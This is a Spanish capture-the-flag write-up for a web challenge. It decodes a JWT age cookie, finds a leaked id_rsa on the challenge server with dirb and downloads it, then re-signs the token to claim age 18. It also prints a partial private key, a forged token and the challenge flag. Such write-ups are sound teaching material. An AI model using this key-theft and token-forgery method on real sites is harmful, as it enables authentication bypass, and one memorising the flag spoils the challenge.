<h1 align="center">
    🍻 JaggerWhiskyTequila II 🍻
</h1>

## 💭 Concepto

Cuando se accede a la web, se pueden observar el mismo contenido que en el reto anterior ([JaggerWhiskyTequila](./JaggerWhiskyTequila.md)). Al intentar comprar una, nos redirige a la URL `/compra` donde nos aparece el siguiente mensaje:

> No tienes +18 años

Exactamente igual que antes, si comprobamos las cookies, encontraremos una con el nombre de `cliente` y un valor similar a este:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJlZGFkIjoxOH0.wy2HzlTakbUXb0BFEw1nVI5ItrXdDxQ-UpmNV9_KuN1MBH5UwKNPoebu4Nn7k0jw3GFWoXTnIhQcrvPEH_Xj6LwMk716EAm8n7uSp_XWKNjZTlzKm0_IhW_k3YnQxd9hAYDH8OpiaU4o4ubhBGWX3qbBWwc1ZUxOYfu29lAons3e3oAKd7u1-YF4oHsik29OrdDKU5A12hkQoygRs7XCVYHQMTlHjM6tyD0RiAJn20TIwD6RxXQlpJib7_RkJpk3SEmIqrWyto3OwfRmehVJ-qToJmvAAVsHaqDYEzZEiFXIDNlI6W71R0UpRU8XvlUxXa5WGM9fhVF5rgNc7aNVzdt-Y1xf3UAv68_vmmPcsvjyw9DpnGDQCMXBObqP0HV3zpFUuak33ZB4EVZRXq9MFkvsj2CXY58cHh4psppF6vmIR7-tOfTqLkg6G2FUhDOTn_x6mDRZ1xOWio8gK1qt5Mf3rml3KSDGWae0vdcFfihMIyyO5-0V-5WSYopH409tJw20vzZm6AsrhPW9RZiczK0efZRCXa22Tb5j9c03Cewt4JQ6Xcj6s-eiBW_99XQUkcpivshaHtKSwzaSFLNfBhwjir7dpug_DVejEF4XJ_62Qu6jWPTa0UPa_oor6p8uXwkzMCC5-g4oVGxLuoTp1f42VUkK4UFKiUZVb0g3tzk
```

Ya sabemos que el reto estará basado en vulnerabilidades conocidas de `JWT`. Además, si accedemos a la página raíz, podemos encontrar el siguiente comentario en el código fuente:

```html
<!-- Como la última vez nos hackearon, he generado una llave pública y otra privada para evitar que vuelva a suceder -->
```

## 📜 Teoría

Lo primero de todo es decodificar la cookie. Para ello podemos hacer uso de herramientas online, como [JWT.io](https://jwt.io/), o segmentar la cadena según el delimitador (en este caso, un punto), dado que JWT sigue el siguiente formato:

<h1 align="center">
    <img alt="JWT Format" src="../.img/jwt-format.webp" />
</h1>

En el **Header** se especifica el tipo de formato que se utiliza, así como el algoritmo a usar para cifrar/descifrar los datos.

En el caso del reto, la información obtenida es la siguiente:

```sh
echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9" | base64 -d
# {"typ":"JWT","alg":"RS256"}
```

> `RS256` indica que el **Payload** está cifrado usando claves asimétricas

Si hacemos lo mismo con el segundo fragmento, podemos obtener la información guardada actualmente en la cookie:

```sh
echo -n "eyJlZGFkIjoxN30" | base64 -d
# {"edad":17}
```

Como vimos en la página de `/compra`, el mensaje nos indicaba que no teníamos más de 18 años. Ya sólo queda buscar la manera de modificar el valor de la cookie para especificar una edad mayor.

> Como se trata de una versión mejorada de un reto anterior, evitaremos intentar explotaciones antiguas

## 💣 Explotación

La vulnerabilidad de este reto no se encuentra en el `JWT` en sí, sino en la premisa de que sabiendo qué clave se ha usado durante el cifrado, seremos capaces de modificar el **Payload**.

```yml
Vulnerabilidad: Claves privadas leakeadas
```

Aunque no es habitual encontrarse este fallo en entornos reales, hay veces que los desarrolladores cometen descuidos a la hora de subir los archivos que conforman una página web.

Siendo la URL del reto `http://ctf.kike.wtf:2010/`, ejecutaremos `dirb` con el fin de encontrar algún fichero oculto:

```sh
dirb http://ctf.kike.wtf:2010/
```

El resultado será similar a esto:

```
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Tue Dec  8 11:13:02 2020
URL_BASE: http://ctf.kike.wtf:2010/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://ctf.kike.wtf:2010/ ----

+ http://ctf.kike.wtf:2010/id_rsa (CODE:200|SIZE:3243)
+ http://ctf.kike.wtf:2010/robots.txt (CODE:200|SIZE:25)

-----------------
END_TIME: Tue Dec  8 11:13:08 2020
DOWNLOADED: 4612 - FOUND: 2
```

Llama la atención el archivo `id_rsa`. Para descargarlo, basta con acceder al enlace o utilizar herramientas como `wget`:

```sh
wget http://ctf.kike.wtf:2010/id_rsa
```

El contenido del archivo nos indica que es una clave privada:

```
-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEA18Ra2jDgHFRkuOgx4y4jhAzbt112/RRblmqpB31//CHOp/H8
FFO2eMI4TSxCUtMyODbJw6GhxCi0bCBKNfPIM8liMIm9337cza3rVyYmK/6nqPXH
5HXj6KFflpoRekg5Oy8+wBmwPzYjvcRKUGr2TqKdpvSSseYL/7m3na7UDuiX34hE
    ... ... ...
AVN9BjTW6DZ/9RcOfStMoxee4Lf43hSkTh6EC4M3IHGWzCfQSFItbgsM9HjZFacY
FK4JJgp3NUIfabVey+20datpoFlcNp6RfImCnHxxso70QUOMOJku5StQbNcGY5WI
hC3nxCzxssVRJFh8K2hCPv+KKgPOLozIVcJqia1CzSdmU46PkRoE30xCQXW8
-----END RSA PRIVATE KEY-----
```

Para modificar el **Payload** necesitamos también la clave pública. Para ello, podemos recuperarla a partir de la clave privada usando el siguiente comando:

```sh
openssl rsa -in id_rsa -pubout -outform PEM -out id_rsa.pub
```

Una vez hecho esto, haremos uso de herramientas online como [JWT.io](https://jwt.io) para modificar el contenido. El resultado será algo similar a esto:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJlZGFkIjoxOH0.c5Ey9cWn2zAfHgZEySSPzWrph7LFnoC-UvsuZwFF2g9c6vY8bvq_8D83VC6n-FDHefkZZVKYFxUMDXSP63jr60Ob2P9ubifDglFQ_kRpFJ4lYJoPxKo2wrcNJahV9mQVgkh9Jj9GW0rvrRjGlKm6_cZ3dp3S8xVHcMs_AIlDsImwP-U-QcHgcZBTaez0JtXkHNPikIhk4nFJzTnaczLqNjEmZuxSDy_gL70_2RFyemhX5upjTxWtfiTRdX_xtbpWUDAsiEOeDbnbv6qJVvBkwiwi1f0bPlxaxmebTIB4Jx0DSQie0iXTAWXcsf1jjvK-3dfnFdESUNSx2AoEmChHp56YBiYzd-xIrZSsjJlsVZrFDvUkdVVKogrGWeC1wAnvt8jCzTYHfsI1Ul_2onF6RDbSNRIyexBT8Bkxkrc3nkT3ng5679Qp9oGNISD4DGqB5e7rnSJFXtUJWCyNUcud_vZ11PjFjYh5Ggt4BvhWCAeZY36tURDwhXXQEVXQ56XTL4NsPeK8-S63w1cRCnimxx8KXWGeg0WJerQJp67-IGF_nSNC6cw6IWz7It8Sg5_FDZXOmDR65Lv4F9XzuopIC1NXt1BZKmGydT2Aorx4yfEt-Dnkq_0Hk_QgldfKrvKB4sgV4o64uOTug1TTihIh3vGWTp816UL1_FmIa6zkKUI
```

> Las claves públicas y privadas se regeneran de vez en cuando, por lo que es posible que las usadas en esta solución no coincidan con las del reto.

Igual que antes, sólo queda reemplazar el nuevo token en la página y recargar para obtener la `flag`.

## 🏁 Flag

```
pumaCTF{mY_pr1vat3_add1ct10n}
```